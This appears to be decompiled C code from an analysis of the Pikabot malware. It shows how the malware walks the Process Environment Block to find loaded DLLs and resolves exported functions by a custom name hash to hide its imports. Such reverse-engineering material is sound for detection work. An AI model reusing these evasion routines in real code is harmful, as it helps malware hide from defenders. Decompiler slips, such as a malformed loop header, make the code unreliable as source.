
// ---------------------- DLL ----------------------- //

int get_dll(ushort *library_name)
{  
  PEB = get_PEB();
  firstModule_ptr = *(int *)(*(int *)((int)PEB + 0xc) + 0xc);
  module_entry = *(int **)(*(int *)((int)PEB + 0xc) + 0xc);
  do {
    moduleName = (ushort *)module_entry - 0x4 + 0x30; // module_entry + 0x2c
    ret = compareName(moduleName, library_name,0);
    if (ret == 0) {
      return module_entry + 0x18;
    }
    module_entry = (int *)*module_entry;
  } while (module_entry != (int *)firstModule_ptr);
  return 0;
}

void * get_PEB(void)
{
  return ProcessEnvironmentBlock;
}

undefined4 __cdecl compareName(ushort *moduleName, ushort *dll_name, int zero)
{
  moduleName_len = strLen((short *)moduleName);
  dll_name_len = strLen((short *)dll_name);

  if (moduleName_len == dll_name_len) {
    for (i = 0; , i < moduleName_len; i = i + 1) {
      modeuleChar_i = *moduleName;
      dllChar_i = *dll_name;
      // convert chars to lower case
      if ((0x40 < modeuleChar_i) && (modeuleChar_i <= 0x5a - zero)) {
        modeuleChar_i = modeuleChar_i + 0x20;
      }
      if ((0x40 < dllChar_i) && (dllChar_i < 0x5b)) {
        dllChar_i = dllChar_i + 0x20;
      }
      // chars are different return failure
      if (modeuleChar_i != dllChar_i) {
        return 1;
      }
      moduleName = moduleName + 1;
      dll_name = dll_name + 1;
    }
    retVal = 0;
  } else {
    retVal = 1;
  }
  return retVal;
}

int __cdecl strLen(short *param_1)
{
  int len;
  len = 0;
  for (; *param_1 != 0; param_1 = param_1 + 1) {
    len = len + 1;
  }
  return len;
}

// ---------------------- FUNCTIONS ----------------------- //

int __cdecl resolver(int library_ptr, int hash)
{
  eat = library_ptr + *(int *)(library_ptr + *(int *)(library_ptr + 0x3c) + 0x78);
  names = *(int *)(eat + 0x20);
  addresses = *(int *)(eat + 0x1c);
  indexes = *(int *)(eat + 0x24);

  i = 0;
  while( true ) {
    if (*(uint *)(eat + 0x18) <= i) {
      return 0;
    }
    hash_i = hashPikabot((byte *)(library_ptr + *(int *)(library_ptr + names + i * 4)));
    if (hash_i == hash) break;
    i = i + 1;
  }
  return library_ptr +
         *(int *)(library_ptr + addresses + (uint)*(ushort *)(library_ptr + indexes + i * 2) * 4);
}

int __cdecl hashPikabot(byte *function_name)
{
  hash = 0;
  for (; *function_name != 0; function_name = function_name + 1) {
    hash = ((*function_name | 0x60) + hash) * 2;
  }
  return hash;
}

